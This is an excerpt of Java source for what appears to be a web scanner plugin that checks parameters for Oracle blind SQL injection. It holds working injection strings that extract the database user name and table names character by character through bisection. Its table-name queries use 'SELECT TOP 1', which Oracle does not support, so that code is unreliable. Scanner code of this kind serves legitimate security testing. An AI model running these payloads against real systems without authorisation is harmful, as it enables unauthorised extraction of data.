...
public class TestInjectionOracleSQLEnumeration extends AbstractAppParamPlugin {
	...
	public void scan(HttpMessage baseMsg, String param, String value) {
		...
		if (getKb().getString("sql/oracle/username") != null
				&& getKb().getString("sql/oracle/tablename") != null) {
			return;
		}
	 ...
	 */
	public void scanSQL(HttpMessage baseMsg, String param, String value)
	...
	private void checkDBUserName(HttpMessage msg, String param, String value)
			throws HttpException, IOException {
		...
		if (result.length() > 0) {
			...
			bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "",
					"current db user name: " + result, msg);

		}
	}

	private int getDBUserNameBisection(HttpMessage msg, String param,
			String value, int charPos, int rangeLow, int rangeHigh)
			throws HttpException, IOException {
		...
		int charResult = getDBUserNameBisection(msg, param, value, charPos,
				rangeLow, rangeHigh);
		return charResult;
	}

	private boolean getDBUserNameQuery(HttpMessage msg, String param,
			String value, int charPos, int charCode) throws HttpException,
			IOException {

		// linear search - inefficient
		// String s1 = "' AND ASCII(SUBSTR(USER_NAME()," + (charPos +1) +
		// ",1)) = " + charCode + " AND '1'='1";
		String s1 = "' AND ASCII(SUBSTR(USER," + (charPos + 1) + ",1))>"
				+ charCode + " AND '1'='1";
		...
		if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
			...
			resBodyAND = stripOff(msg.getResponseBody().toString(),
					getURLEncode(s1));
	...
	private void checkDBTableName(HttpMessage msg, String param, String value)
			throws HttpException, IOException {
		...
		for (int row = 1; row < 4; row++) {
			...
			for (int i = 0; i < 10; i++) {
				...
				charValue = getTableNameBisection(msg, param, value, i, 47,
						123, row);
				if (charValue == 47 || charValue == 123) {
					break;
				}
			...
			if (result.length() > 0) {
				...
				bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "",
						"table name: " + result, msg);

			}
		}
	}

	private int getTableNameBisection(HttpMessage msg, String param,
			String value, int charPos, int rangeLow, int rangeHigh, int row)
			throws HttpException, IOException {
		if (rangeLow == rangeHigh) {
			return rangeLow;
		}
		...
		int medium = (rangeLow + rangeHigh) / 2;
		boolean result = getTableNameQuery(msg, param, value, charPos, medium,
				row);
		...
		int charResult = getTableNameBisection(msg, param, value, charPos,
				rangeLow, rangeHigh, row);
		return charResult;
	}

	private boolean getTableNameQuery(HttpMessage msg, String param,
			String value, int charPos, int charCode, int row)
			throws HttpException, IOException {
		...
		if (row == 1) {
			s1 = "' AND ascii(substr((SELECT TOP 1 object_name FROM user_objects WHERE object_type='TABLE' ORDER BY object_name),"
					+ (charPos + 1) + ", 1))>" + charCode + " AND '1'='1";
		} else {
			s1 = "' AND ascii(substr((SELECT TOP 1 a.object_name FROM user_objects as a WHERE a.object_type='TABLE' AND a.object_name NOT IN(SELECT TOP "
					+ (row - 1)
					+ " b.object_name FROM user_objects AS b WHERE b.object_type='TABLE' order by b.object_name)),"
					+ (charPos + 1) + ", 1))>" + charCode + " AND '1'='1";
		}
